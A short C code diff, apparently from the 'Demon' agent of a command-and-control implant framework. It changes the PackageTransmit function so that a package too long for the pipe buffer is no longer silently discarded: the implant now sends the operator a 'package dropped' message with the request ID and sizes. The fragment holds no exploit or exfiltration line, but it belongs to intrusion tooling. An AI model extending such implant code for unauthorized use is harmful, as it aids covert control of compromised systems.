@@ -281,7 +281,9 @@ BOOL PackageTransmitNow(
 VOID PackageTransmit(
     IN PPACKAGE Package
 ) {
-    PPACKAGE List = NULL;
+    PPACKAGE List      = NULL;
+    UINT32   RequestID = 0;
+    UINT32   Length    = 0;
 
     if ( ! Package ) {
         return;
@@ -297,14 +299,18 @@ VOID PackageTransmit(
         {
             PRINTF( "Trying to send a package that is 0x%x bytes long, which is longer than PIPE_BUFFER_MAX, discarding...\n", Package->Length )
 
+            RequestID = Package->RequestID;
+            Length    = Package->Length;
+
             // destroy the package
             if ( Package->Destroy ) {
                 PackageDestroy( Package );
             }
 
-            // TODO: notify the operator that a package was discarded
-
-            return;
+            // notify the operator that a package was discarded
+            Package = PackageCreateWithRequestID( DEMON_PACKAGE_DROPPED, RequestID );
+            PackageAddInt32( Package, Length );
+            PackageAddInt32( Package, PIPE_BUFFER_MAX );
         }
 #endif
 
